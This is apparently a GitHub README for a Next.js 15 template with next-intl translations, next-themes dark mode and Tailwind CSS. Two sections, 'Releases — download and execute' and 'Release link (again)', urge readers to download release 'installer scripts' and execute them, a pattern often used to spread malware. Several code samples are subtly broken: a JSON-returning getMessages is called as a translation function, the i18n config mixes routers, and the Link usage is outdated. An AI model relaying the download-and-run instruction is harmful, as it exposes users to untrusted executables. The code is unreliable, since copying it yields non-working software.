# Next.js 15 SSR Template — i18n, Dark Mode, Tailwind CSS 🌐🌙

[![Releases](https://img.shields.io/github/v/release/Conxpt/nextjs-i18n-themes-ssr-template?label=Releases&color=2b9348)](https://github.com/Conxpt/nextjs-i18n-themes-ssr-template/releases)

Next.js 15対応 多言語・ダークモード対応SSRテンプレート  
A multilingual and theme-enabled SSR template using Next.js, next-intl, and next-themes.

Badges
- [![Next.js](https://img.shields.io/badge/Next.js-15-black?logo=next.js)](https://nextjs.org/)
- [![TypeScript](https://img.shields.io/badge/TypeScript-4.9-blue?logo=typescript)](https://www.typescriptlang.org/)
- [![Tailwind CSS](https://img.shields.io/badge/Tailwind%20CSS-3.0-skyblue?logo=tailwindcss)](https://tailwindcss.com/)
- [![next-intl](https://img.shields.io/badge/next--intl-i18n-yellowgreen)](https://github.com/vercel/next-intl)
- [![next-themes](https://img.shields.io/badge/next--themes-theme-gray)](https://github.com/pacocoursey/next-themes)
- Topics: dark-mode, i18n, next-intl, next-themes, nextjs, react, ssr, tailwindcss, template, typescript

Hero image  
![Code setup dark mode](https://images.unsplash.com/photo-1526378721520-7e6b9b9d7f8b?auto=format&w=1600&q=60)

Table of contents
- Features
- Quick start
- Releases (download + execute)
- Folder structure
- i18n (next-intl) — SSR usage
- Themes (next-themes) — dark / light
- Tailwind CSS — dark mode styling
- Routing and middleware
- Scripts
- Deploy
- Testing and linting
- Contributing
- License

Features
- Server-side rendering with Next.js 15 and TypeScript.
- Locale-aware routes and server-side translations with next-intl.
- System and user-controlled theme with next-themes (dark/light).
- Tailwind CSS with class-based dark mode.
- Full TypeScript types for messages, locale keys, and theme state.
- Example pages: home, about, settings, and a localized 404.
- Ready for static assets, images, and i18n-aware meta tags for SEO.

Quick start

Prerequisites
- Node.js 18 or newer
- pnpm (recommended) or npm / yarn
- Git

Clone and run locally
```bash
git clone https://github.com/Conxpt/nextjs-i18n-themes-ssr-template.git
cd nextjs-i18n-themes-ssr-template
pnpm install
pnpm dev
```

Build and preview
```bash
pnpm build
pnpm start
```

Releases — download and execute
- Visit the Releases page and download the template asset: https://github.com/Conxpt/nextjs-i18n-themes-ssr-template/releases
- The release file contains prebuilt templates or installer scripts. Download the asset and execute it on your machine.
- Example (replace file name with the actual asset):
```bash
# download (use browser or curl)
curl -L -o template-release.tar.gz "https://github.com/Conxpt/nextjs-i18n-themes-ssr-template/releases/download/vX.Y.Z/template-release.tar.gz"

# extract and run setup
tar -xzf template-release.tar.gz
cd nextjs-i18n-themes-ssr-template
pnpm install
pnpm dev
```

If the releases link fails, check the Releases section on GitHub. The release badge above links to the same page: https://github.com/Conxpt/nextjs-i18n-themes-ssr-template/releases

Folder structure (key parts)
- /app or /pages — Next.js routes (app router supported)
- /locales — JSON or TS message files per locale (en.json, ja.json, ...)
- /components — UI components (ThemeToggle, LocaleSwitcher, Layout)
- /lib — small helpers (i18n loader, type guards)
- /styles — Tailwind config, global CSS
- /public — static assets and images
- next.config.js / tsconfig.json — project config

i18n with next-intl (server-side)

Core idea
- Store messages per locale in /locales.
- Load messages on the server.
- Provide typed message keys to components.

Example message file: /locales/en.json
```json
{
  "home.title": "Welcome",
  "home.subtitle": "Server-rendered, localized pages"
}
```

Server-side page (app router example)
```ts
// app/(localized)/page.tsx
import { useTranslations } from 'next-intl';
import type { Metadata } from 'next';
import { getMessages } from '../../lib/getMessages';

export async function generateMetadata({ params }): Promise<Metadata> {
  const t = await getMessages(params.locale);
  return { title: t('home.title') };
}

export default async function Page({ params }: { params: { locale: string } }) {
  const t = await getMessages(params.locale);
  return (
    <main>
      <h1>{t('home.title')}</h1>
      <p>{t('home.subtitle')}</p>
    </main>
  );
}
```

Classic pages with getServerSideProps
```ts
// pages/index.tsx
import { getMessagesFor } from '../lib/i18n';
export const getServerSideProps = async ({ locale }) => {
  const messages = await getMessagesFor(locale);
  return { props: { messages } };
};
```

Type-safe messages
- Generate a TS type from your message keys.
- Use the type in components to get autocomplete and error checks.

Themes with next-themes

Install and Provider
- Wrap your app in ThemeProvider.
- Configure defaultTheme and enable system preference.

_app.tsx or layout.tsx
```tsx
import { ThemeProvider } from 'next-themes';

export default function RootLayout({ children }) {
  return (
    <ThemeProvider attribute="class" defaultTheme="system" enableSystem>
      {children}
    </ThemeProvider>
  );
}
```

Toggle component
```tsx
import { useTheme } from 'next-themes';

export function ThemeToggle() {
  const { theme, setTheme } = useTheme();
  return (
    <button onClick={() => setTheme(theme === 'dark' ? 'light' : 'dark')}>
      {theme === 'dark' ? 'Light' : 'Dark'}
    </button>
  );
}
```

Persisted preference
- next-themes persists the selected theme in localStorage by default.
- The server renders with class-based dark mode using attribute="class".

Tailwind CSS and dark mode

tailwind.config.js
```js
module.exports = {
  darkMode: 'class',
  content: ['./app/**/*.{js,ts,jsx,tsx}', './components/**/*.{js,ts,jsx,tsx}'],
  theme: { extend: {} },
  plugins: [],
};
```

Usage in components
```tsx
<div className="bg-white text-gray-900 dark:bg-gray-900 dark:text-gray-100">
  <h1 className="text-2xl font-bold">Content</h1>
</div>
```

Routing and middleware

Locale-aware routes
- Use dynamic segment for locale: /[locale]/page
- Set up default locales in next.config.js

next.config.js example
```js
module.exports = {
  i18n: {
    locales: ['en', 'ja'],
    defaultLocale: 'en',
  },
};
```

Middleware for locale detection (optional)
```ts
// middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(req: NextRequest) {
  const pathname = req.nextUrl.pathname;
  if (pathname === '/') {
    const locale = req.headers.get('accept-language')?.split(',')[0].split('-')[0] || 'en';
    return NextResponse.redirect(new URL(`/${locale}/`, req.url));
  }
  return NextResponse.next();
}
```

SEO and localized meta tags
- Render meta tags server-side with translated strings.
- Use open graph tags per locale.

Scripts

Common scripts in package.json
```json
{
  "scripts": {
    "dev": "next dev",
    "build": "next build",
    "start": "next start",
    "lint": "eslint . --ext .ts,.tsx",
    "typecheck": "tsc --noEmit",
    "format": "prettier --write ."
  }
}
```

Deploy

Deploy to Vercel
- Vercel supports Next.js SSR and edge functions.
- Set environment variables if you use external services.
- Use the "Framework Preset" for Next.js.

Other hosts
- Use Docker for platforms that need container deployment.
- Static export is possible for non-SSR pages.

Testing and linting

Unit tests
- Example using Jest and React Testing Library.
- Test components with simple render and snapshot checks.

Linting and type checking
- ESLint with next and react hooks rules.
- Run pnpm lint and pnpm typecheck before push.

Contributing
- Open issues for bugs or feature suggestions.
- Keep PRs small and focused.
- Use branch names that describe work (feature/i18n, fix/theme-toggle).
- Run lint and typecheck in CI.

Common patterns
- Keep message keys flat and descriptive: home.title, settings.theme.
- Load only the locale messages you need on the server.
- Use Next.js metadata APIs to set title and meta tags per page.
- Use attribute="class" with next-themes for Tailwind dark classes.

Examples

Locale switcher
```tsx
import Link from 'next/link';
export function LocaleSwitcher({ current, locales }) {
  return (
    <nav>
      {locales.map((loc) => (
        <Link key={loc} href={`/${loc}`}>
          <a className={loc === current ? 'font-bold' : ''}>{loc.toUpperCase()}</a>
        </Link>
      ))}
    </nav>
  );
}
```

Server loader helper (lib/getMessages.ts)
```ts
import en from '../locales/en.json';
import ja from '../locales/ja.json';

export function getMessages(locale: string) {
  if (locale === 'ja') return ja;
  return en;
}
```

Persistent settings
- Keep user preferences server-side if you need cross-device sync.
- Use cookies or a small preferences API for SSR reads.

Security and performance
- Avoid shipping unneeded locales to the client.
- Use next/image for optimized images.
- Use caching headers for static assets.

License
- MIT

Resources
- Next.js: https://nextjs.org/
- next-intl: https://github.com/vercel/next-intl
- next-themes: https://github.com/pacocoursey/next-themes
- Tailwind CSS: https://tailwindcss.com/

Release link (again)
- Download release assets and run them from: https://github.com/Conxpt/nextjs-i18n-themes-ssr-template/releases

Screenshots
- Dark mode example:  
  ![Dark mode preview](https://images.unsplash.com/photo-1526378721520-7e6b9b9d7f8b?auto=format&w=1200&q=60)
- Light mode example:  
  ![Light mode preview](https://images.unsplash.com/photo-1515879218367-8466d910aaa4?auto=format&w=1200&q=60)